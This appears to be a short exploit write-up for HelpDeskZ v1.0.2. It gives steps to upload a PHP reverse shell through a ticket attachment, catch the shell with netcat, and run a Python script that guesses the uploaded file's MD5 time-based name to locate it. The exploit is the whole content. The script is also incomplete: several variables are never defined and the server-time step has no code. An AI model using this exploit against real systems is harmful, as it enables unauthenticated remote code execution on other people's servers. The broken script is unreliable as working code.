The default configuration of this software allows for php files  to be uploaded

Steps to reproduce

Fill out a ticket form and attach a php file, solve the captcha and upload,
(the application will display 'File is not allowed' but the file is still uploaded!!

Set up a netcat session to catch the reverse shell

Run this script and receive a reverse shell back!!!

import hashlib
import time, calendar
import sys
import requests

print 'HelpDesk v1.0.2 - Unauthenticated shell upload'

if len(sys.argv) < 3:
    print "Usage: {} http://helpdeskz.com/support/uploads/tickets/ Reverse-shell.php".format(sys.argv[0])

#Getting the Time from the server

for x in range(0,300):
    plaintext = fileName + str(currentTime -x)
    md5hash = hashlib.md5(plaintext).hexdigest()

    url = helpdeskzBaseUrl + md5hash + '.php'
    response = requests.head(url)
    if response.status_code == 200:

        print(url)
        sys.exit(0)

print("Sorry, I did not find anything")
